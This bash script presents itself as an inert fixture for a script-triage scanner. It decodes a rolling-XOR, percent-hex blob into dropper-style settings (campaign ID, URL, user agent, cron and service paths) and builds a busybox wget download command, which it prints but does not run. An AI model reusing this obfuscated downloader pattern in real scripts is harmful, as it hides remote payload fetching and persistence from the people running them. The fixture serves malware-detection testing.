#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_53b26770='%53%6e%5f%23%50%24%41%31%42%7f%1e%7d%0c%79%10%62%07%58%2a%4f%22%4d%39%5c%70%07%75%1c%68%0d%52%34%5d%31%54%28%49%2d%4c%3c%48%2d%5f%62%00%75%06%7f%1d%72%0a%55%22%45%20%54%0b%64%11%65%15%60%14%68%1b%6f%0e%69%0c%53%30%5f%2a%44%30%0d%3c%40%23%42%2f%5f%3e%57%30%5e%01%68%0c%31%52%33%5e%2e%4f%26%41%2f%02%31%01%34%51%65%51%33%55%36%03%7f%0a%78%14%29%41%35%41%31%42%78%57%78%4b%7b%4e%2b%1f%2b%49%2f%4c%79%57%32%4a%2b%46%36%5a%3f%11%78%16%60%01%6d%04%60%4f%76%46%22%1b%2e%17%72%11%3f%4c%24%58%2d%5e%3b%49%16%77%10%75%1b%6f%52%1a%6f%01%75%07%62%11%62%2e%4f%2d%02%31%01%34%51%65%51%33%55%36%03%7f%19%70%1c%79%26%56%37%43%2b%16%39%4d%20%50%7f%17%62%0c%78%0a%6f%1c%6f%42%21%40%23%4b%2e%01%2f%5c%28%49%2e%4b%66%55%65%50%35%01%35%57%31%52%67'
readonly Codec_53b26770='percent_hex|rolling_xor|25'

Load_53b26770() {
  v_a19c=()
  local raw="${Material_53b26770}" v_f602
  for v_f602 in ${raw//%/ }; do [[ -n "$v_f602" ]] && v_a19c+=("$((16#$v_f602))"); done
}

Decode_53b26770() {
  v_b27e=()
  local v_a702=37
  local v_e598
  for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
    v_b27e+=("$((v_a19c[v_e598] ^ v_a702))")
    v_a702=${v_a19c[v_e598]}
  done
}

Recover_53b26770() {
  local -a v_a19c v_b27e
  local v_c304 v_d41a v_b803 v_e598
  v_d41a="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_53b26770
  case 1 in 1) Decode_53b26770 ;; *) return 70 ;; esac
  v_c304=''
  local octal character
  for v_e598 in "${!v_b27e[@]}"; do
    printf -v octal '%03o' "${v_b27e[v_e598]}"
    printf -v character '%b' "\\$octal"
    v_c304+="$character"
  done
  printf '%s\n' "$v_c304"
}

Inspect_53b26770() { Recover_53b26770; }

Plan_53b26770() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_53b26770)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(busybox wget -qO "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_53b26770; fi
